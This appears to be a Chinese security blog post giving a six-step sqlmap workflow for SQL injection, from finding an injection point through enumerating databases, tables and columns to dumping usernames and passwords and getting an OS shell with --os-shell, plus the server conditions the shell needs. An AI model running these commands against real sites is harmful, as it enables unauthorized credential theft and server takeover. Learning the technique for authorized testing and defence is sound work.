---
title: sql注入——sqlmap6步注入法
date: 2020-01-17 18:43:43
tags: [Web安全,sql注入,sqlmap]
---

​	前段时间一直在研究Webshell相关内容，涉及到使用sql注入进行getshell，因此准备对于sql注入过程做一个比较系统的总结，sql注入部分主要分为sqlmap6步法和手工注入法两部分，本文将主要针对sqlmap注入法进行介绍，手工注入法将在[下一篇文章中进行介绍]()。

### sqlmap注入6步法

​	首先要进行介绍的就是sql注入到getshell的常见6步法，该方法涵盖了整个过程常见的全部关键步骤。本文主要介绍使用sqlmap工具来进行sql注入的过程。

**1.判定是否存在注入点**

~~~shell
# 对提供的网址进行注入点测试   
sqlmap -u http://xxx/id=??? --batch
	--batch:表示全部需要人机交互的部分采用默认选项进行选择
	--cookie: cookie为可选项，如果要使用登录的请求应该先使用brupsuite来进行抓包查看ccokie写入该参数
	--r: post方式进行注入，先使用bp抓到完整的包，然后保存为一个文件，这里直接使用-r进行指定
~~~

![](https://github.com/AnchoretY/images/blob/master/blog/sqlmap注入点检测2.png?raw=true)

输出结果：

![](https://github.com/AnchoretY/images/blob/master/blog/sqlmap注入点检测.png?raw=true)

**2.数据库名获取**

~~~shell
# 获取数据库名称
sqlmap -u "http://xxx/id=???"   --current-db --batch
	--cunrrent-db：进行数据库探测选项
~~~

![](https://github.com/AnchoretY/images/blob/master/blog/sqlmap数据库探测2.png?raw=true)

输出结果：

![](https://github.com/AnchoretY/images/blob/master/blog/sqlmap数据探测.png?raw=true)

**3.获取数据库中的表名**

~~~shell
# 获取表名
sqlmap -u "http://xxx/id=???"  --D 数据库名称 --tables --batch
	-D：指定要探测数据库名称
	--tables：进行表名探索选项
~~~

![](https://github.com/AnchoretY/images/blob/master/blog/sqlmap数据表探测2.png?raw=true)

输出结果：

![](https://github.com/AnchoretY/images/blob/master/blog/sqlmap数据表探测.png?raw=true)

**4.对选定表的列名进行获取**

~~~shell
# 获取表中字段名称
sqlmap -u "http://xxx/id=???"  --D 数据库名称 --T 表名 --columns --batch
	-D：指定要进行探索的表
	-columns：进行字段名称探索选项
~~~

![](https://github.com/AnchoretY/images/blob/master/blog/sqlmap字段探测2.png?raw=true)

输出结果：

![](https://github.com/AnchoretY/images/blob/master/blog/sqlmap字段探测.png?raw=true)

**5.探测用户名密码**

~~~shell
# 获取用户名和密码并保存到指定文件
sqlmap -u "http://xxx/id=???"  --D 数据库名称 --T 表名 --C 用户名列名,密码列名 --dump
	-C:指定选择的列名
	--dump：将内容输出到文件
~~~

![](https://github.com/AnchoretY/images/blob/master/blog/sqlmap用户名密码数据读取2.png?raw=true)

输出结果：

![](https://github.com/AnchoretY/images/blob/master/blog/sqlmap用户名密码数据读取.png?raw=true)

**6.获取shell**

​	os-shell只是一个辅助上传大马、小马的辅助shell，可以使用也可以直接利用数据库备份功能人工上传大、小马不进行这一步。

~~~shell
# 获取os-shell
sqlmap -u "http://xxx/id=???" --os-shell
~~~

​	这里使用os-shell需要很高的权限才能成功使用。具体需要的权限包括：

> 1.网站必须是root权限
>
> 2.了解网站的绝对路径  
>
> 3.GPC为off，php主动转义的功能关闭
>
> 4.secure_file_priv= 值为空

​	使用sqlmap存在一种缓存机制，如果完成了一个网址的一个注入点的探测，下次再进行探测将直接使用上次探测的结果进行展示，而不是重新开始探测，因此有时候显示的结果并不是我们当下探测进型返回的，面对这种情况就加上选项。

~~~shell
--purge 清除之前的缓存日志
~~~



​	本文中提到的是一个标准的简单环境的sql注获取方式，但是在实际环境中，进行sql注入还存在权限不足、不知道绝对路径等关键问题，这些问题将在[sql注入——getshell中的问题]中进行具体讲述。